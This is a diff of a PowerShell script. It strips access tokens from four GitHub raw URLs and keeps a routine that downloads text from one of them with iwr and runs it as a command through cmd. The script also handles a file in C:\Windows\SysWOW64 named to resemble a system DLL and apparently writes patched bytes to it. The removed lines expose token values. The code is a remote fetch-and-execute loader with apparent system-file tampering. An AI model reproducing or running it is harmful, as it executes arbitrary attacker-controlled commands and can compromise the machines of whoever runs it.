@@ -1,7 +1,7 @@
-$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt?token=GHSAT0AAAAAADLSQ7O7JZQZPSCAI6MJJOTM2HRARKQ"
-$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt?token=GHSAT0AAAAAADLSQ7O7G5IGROMOEYWENYVG2HRBE2A"
-$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt?token=GHSAT0AAAAAADLSQ7O74R4WJXLET7UPUQHS2HRAVZQ"
-$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt?token=GHSAT0AAAAAADLSQ7O6DYREXDBDKIBBFQ6K2HRAZDA"
+$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
+$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
+$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
+$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 
@@ -33,3 +33,4 @@ $newBytes = HexToBytes $newHexContent
 $responseD = iwr $urlD
 $finalCmd = $responseD.Content
 Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
+
